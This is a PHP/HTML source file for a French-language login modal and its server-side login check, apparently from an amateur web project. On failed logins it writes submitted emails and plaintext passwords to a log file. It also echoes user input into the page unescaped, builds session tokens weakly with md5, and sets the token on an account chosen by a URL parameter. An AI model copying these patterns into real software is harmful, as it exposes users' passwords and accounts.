<div class="modal fade connectUser" tabindex="-1" role="dialog" aria-labelledby="connection">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Connexion</h4>
      </div>
      <form method="POST">
        <div class="modal-body">
            <div class="form-group">
              <label class="control-label">Email:</label>
              <div class="input-group">
                <span class="input-group-addon"><i class="fa fa-envelope-o" aria-hidden="true"></i></span>
                <input type="email" placeholder="Votre email" class='form-control' name="email" value="<?php echo (isset($form["email"]))?$form["email"]:"" ?>" required>
              </div>
            </div>
            <div class="form-group">
              <label class="control-label">Mot de passe:</label>
              <div class="input-group">
                <span class="input-group-addon"><i class="fa fa-lock" aria-hidden="true"></i></span>
                <input type="password" class='form-control' placeholder="Mot de passe" name="pwd1" required>
              </div>
            </div>
          <div class="">
            Vous n'avez pas de compte? <a href="../functions/CreateUser.php">Créez un compte</a>
          </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-close" data-dismiss="modal">Fermer</button>
          <button type="submit" class="btn btn-validate">Valider</button>
        </div>
    </form>
    </div>
  </div>
</div>
<?php

if(!empty($_POST['pwd1']) && !empty($_POST['email'])){
  $db = connectBdd();
  $verify = $db->prepare("SELECT password, id FROM users WHERE is_deleted is null AND email = :email");
  $verify->execute(['email'=>$_POST['email']]);
  $result = $verify->fetch();
  if( !empty($result) && password_verify($_POST['pwd1'], $result['password'])){
    //Création d'une chaine aléatoire
    $accessToken = md5(uniqid().substr("jojojjooefozfiiefoiizfeon12312", 0, rand(5,10)).time());
    //On le stock en session avec l'email
    $_SESSION["accesstoken"]=$accessToken;
    $_SESSION['email']=$_POST['email'];
    //On l'insère en BDD dans une nouvelle colonne 'access_token'
    $insertion = $db->prepare("UPDATE users SET accesstoken = :access_token WHERE id= :id");
    $insertion->execute(['access_token'=>$accessToken, "id"=>$_GET['id']]);

    // header("Location: index.php");
  }else{
    $msg_error = 'Identifiants incorrects';
    if( !file_exists("log")){
      mkdir("log");
      $file = fopen("log/logging.txt", "a");
      fwrite($file, $_POST['email'].':'.$_POST['pwd1']."\r\n");
      fclose($file);
    }else{
      $file = fopen("log/logging.txt", "a");
      fwrite($file, $_POST['email'].':'.$_POST['pwd1']."\r\n");
      fclose($file);
    }
  }
}
?>
